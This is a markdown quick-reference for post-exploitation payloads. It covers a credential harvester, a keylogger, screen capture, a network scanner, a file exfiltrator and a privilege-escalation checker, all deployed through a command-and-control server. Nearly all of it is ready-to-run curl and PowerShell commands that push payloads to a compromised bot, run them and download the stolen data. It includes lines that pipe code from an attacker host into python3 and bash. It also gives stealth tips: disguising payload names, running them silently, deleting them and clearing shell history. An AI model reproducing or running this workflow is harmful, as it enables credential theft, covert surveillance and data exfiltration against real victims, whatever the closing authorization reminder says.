# Post-Exploitation Payloads - Quick Reference

## Available Payloads

| Payload | Purpose | Key Features |
|---------|---------|--------------|
| **credential_harvester.py** | Extract passwords & credentials | Browser passwords, SSH keys, WiFi passwords, history search |
| **keylogger.py** | Capture keystrokes | Real-time logging, cross-platform, timestamp tracking |
| **screenshot_capture.py** | Screen surveillance | Automated capture, configurable intervals, silent operation |
| **network_scanner.py** | Network reconnaissance | Host discovery, port scanning, service identification |
| **file_exfiltrator.py** | Data collection | Pattern-based search, content search, automatic archiving |
| **privesc_checker.py** | Privilege escalation | Automated vector detection, detailed reporting |

## Quick Deploy Commands

### 1. Credential Harvesting
```bash
# Deploy via C&C
curl -X POST http://cnc:5000/upload_file \
  -d '{"bot_id":"target-1","local_path":"./credential_harvester.py","remote_path":"/tmp/ch.py"}'

# Execute
curl -X POST http://cnc:5000/send_command \
  -d '{"bot_id":"target-1","command":"python3 /tmp/ch.py"}'

# Download results
curl -X POST http://cnc:5000/download_file \
  -d '{"bot_id":"target-1","remote_path":"/tmp/credentials.json","local_path":"./loot/creds.json"}'
```

### 2. Keylogging
```bash
# Deploy & execute in background
curl -X POST http://cnc:5000/send_command \
  -d '{"bot_id":"target-1","command":"curl http://attacker:8080/keylogger.py|python3 - --output /tmp/kl.txt &"}'

# Wait some time, then download
curl -X POST http://cnc:5000/download_file \
  -d '{"bot_id":"target-1","remote_path":"/tmp/kl.txt","local_path":"./loot/keylog.txt"}'
```

### 3. Screenshot Capture
```bash
# Execute with 60-second intervals for 10 minutes
curl -X POST http://cnc:5000/send_command \
  -d '{"bot_id":"target-1","command":"python3 screenshot_capture.py --interval 60 --duration 600 &"}'
```

### 4. Network Scanning
```bash
# Scan local network
curl -X POST http://cnc:5000/send_command \
  -d '{"bot_id":"target-1","command":"python3 network_scanner.py --output /tmp/scan.txt"}'

# Download results
curl -X POST http://cnc:5000/download_file \
  -d '{"bot_id":"target-1","remote_path":"/tmp/scan.txt","local_path":"./recon/network.txt"}'
```

### 5. File Exfiltration
```bash
# Search and archive
curl -X POST http://cnc:5000/send_command \
  -d '{"bot_id":"target-1","command":"python3 file_exfiltrator.py --archive --output /tmp/exfil"}'

# Download archive
curl -X POST http://cnc:5000/download_file \
  -d '{"bot_id":"target-1","remote_path":"/tmp/exfiltrated_*.zip","local_path":"./loot/data.zip"}'
```

### 6. Privilege Escalation Check
```bash
# Run checks
curl -X POST http://cnc:5000/send_command \
  -d '{"bot_id":"target-1","command":"python3 privesc_checker.py"}'

# Download report
curl -X POST http://cnc:5000/download_file \
  -d '{"bot_id":"target-1","remote_path":"/tmp/privesc_report.txt","local_path":"./recon/privesc.txt"}'
```

## PowerShell Equivalents

```powershell
# Execute payload
$body = @{bot_id="target-1"; command="python credential_harvester.py"} | ConvertTo-Json
Invoke-RestMethod -Uri "http://cnc:5000/send_command" -Method POST -ContentType "application/json" -Body $body

# Download results
$body = @{bot_id="target-1"; remote_path="C:\Temp\credentials.json"; local_path=".\loot\creds.json"} | ConvertTo-Json
Invoke-RestMethod -Uri "http://cnc:5000/download_file" -Method POST -ContentType "application/json" -Body $body
```

## Common Red Team Workflow

### 1. Initial Compromise
```bash
# Deploy and register agent
curl http://attacker/linux_agent.sh | bash
```

### 2. Reconnaissance
```bash
# Check for privilege escalation
python3 privesc_checker.py

# Scan network
python3 network_scanner.py
```

### 3. Credential Harvesting
```bash
# Harvest stored credentials
python3 credential_harvester.py

# Start keylogger
python3 keylogger.py --output /tmp/.kl.txt &
```

### 4. Surveillance
```bash
# Capture screenshots
python3 screenshot_capture.py --interval 120 --duration 3600 &
```

### 5. Data Collection
```bash
# Exfiltrate sensitive files
python3 file_exfiltrator.py --archive
```

### 6. Exfiltration
```bash
# Download all collected data via C&C
# Use download_file API endpoint
```

## Dependencies

### Recommended Installation
```bash
# All optional dependencies for full functionality
pip install pynput pillow mss

# On Linux for screenshot support
sudo apt-get install scrot
```

### Minimal Installation
All payloads work with Python standard library, but have reduced functionality without optional dependencies.

## Stealth Tips

1. **Rename payloads** to system-sounding names:
   ```bash
   mv credential_harvester.py system_diagnostics.py
   mv keylogger.py network_monitor.py
   ```

2. **Run in background** with nohup:
   ```bash
   nohup python3 keylogger.py >/dev/null 2>&1 &
   ```

3. **Delete after execution**:
   ```bash
   python3 payload.py && rm -f payload.py
   ```

4. **Clear history**:
   ```bash
   history -c && history -w  # Bash
   ```

## Legal Reminder

**AUTHORIZED USE ONLY**
- Written permission required
- Stay within scope
- Document all actions
- Handle data responsibly

Unauthorized use is illegal and unethical.
